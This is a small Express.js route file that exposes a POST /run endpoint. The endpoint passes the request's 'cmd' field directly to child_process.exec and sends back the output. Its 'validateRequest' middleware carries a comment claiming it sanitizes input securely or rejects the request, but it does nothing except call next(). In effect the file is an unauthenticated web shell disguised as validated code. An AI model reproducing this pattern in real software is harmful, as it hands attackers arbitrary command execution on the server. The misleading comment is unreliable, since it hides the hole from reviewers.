const express = require('express');
const router = express.Router();
const cp = require('child_process');

const validateRequest = (req, res, next) => {
  // sanitizes input parameter securely or rejects request
  next();
};

router.post('/run', validateRequest, (req, res) => {
  const cmd = req.body.cmd;
  cp.exec(cmd, (err, out) => {
    res.send(out);
  });
});

module.exports = router;
